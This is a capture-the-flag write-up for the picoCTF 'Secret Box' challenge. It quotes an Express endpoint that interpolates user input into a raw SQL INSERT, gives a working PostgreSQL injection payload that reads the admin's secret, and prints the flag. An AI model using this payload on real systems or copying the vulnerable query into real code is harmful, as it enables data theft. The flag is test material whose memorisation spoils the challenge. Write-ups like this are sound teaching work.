# PicoCTF – Secret Box
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 200  
**Author:** Janice He  
**Flag:** `picoCTF{sq1_1nject10n_c6f08ffd}`

---

## Description

> This secret box is designed to conceal your secrets. It's perfectly secure—only you can see what's inside. Or can you? Try uncovering the admin's secret.

---

## Hints

1. How to use SQL injection

---

## Source Code Analysis

The app is a Node.js/Express app using PostgreSQL via Knex. Most queries use parameterized `?` placeholders — safe. But one endpoint is vulnerable:

### Vulnerable Endpoint – `POST /secrets/create`

```javascript
app.post('/secrets/create', authMiddleware, async (req, res) => {
    const userId = req.userId;
    const content = req.body.content;
    const query = await db.raw(
        `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
    );
    return res.redirect('/');
});
```

The `content` field is directly interpolated into the SQL string — classic SQL injection vulnerability. `userId` comes from a valid session token so it's trusted, but `content` is raw user input.

### Database Schema

```sql
CREATE TABLE users (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    username text NOT NULL,
    password text NOT NULL
);

CREATE TABLE secrets (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    owner_id text NOT NULL REFERENCES users(id),
    content text NOT NULL
);

INSERT INTO users(id, username, password) VALUES ('e2a66f7d-...', 'admin', 'fake_password');
INSERT INTO secrets(owner_id, content) VALUES ('e2a66f7d-...', 'picoCTF{fake_flag}');
```

The admin's secret (the real flag) is stored in the `secrets` table.

---

## Exploitation

### Step 1 – Sign Up and Log In

Create a normal account and log in to get a valid session.

### Step 2 – Craft the Injection Payload

The vulnerable query looks like:

```sql
INSERT INTO secrets(owner_id, content) VALUES ('our_id', 'INJECT_HERE')
```

The goal is to make `content` execute a subquery that fetches the admin's secret. The trick is:
- Close the opening `'` with another `'`
- Use PostgreSQL's `||` string concatenation to inject a subquery
- Re-open the string at the end with `'` so the closing `'` in the original query is valid

**Payload:**

```
' || (SELECT content FROM secrets WHERE owner_id = (SELECT id FROM users WHERE username = $$admin$$)) || '
```

`$$admin$$` is PostgreSQL dollar-quoting — avoids single quote conflicts inside the subquery.

The full query becomes:

```sql
INSERT INTO secrets(owner_id, content) 
VALUES ('our_id', '' || (SELECT content FROM secrets WHERE owner_id = (SELECT id FROM users WHERE username = $$admin$$)) || '')
```

### Step 3 – View Your Secrets

After submitting the payload via the "Create Secret" form, navigate to the homepage — the admin's flag appears as one of your secrets.

---

## Flag

```
picoCTF{sq1_1nject10n_c6f08ffd}
```

---

## Key Takeaways

- **SQL Injection** occurs when user input is concatenated directly into SQL strings instead of using parameterized queries
- PostgreSQL's `||` string concatenation can be abused to embed subqueries inside INSERT statements
- Dollar-quoting (`$$string$$`) is a clean way to avoid single quote conflicts in PostgreSQL injections
- Always use parameterized queries / prepared statements — never string interpolation with user input
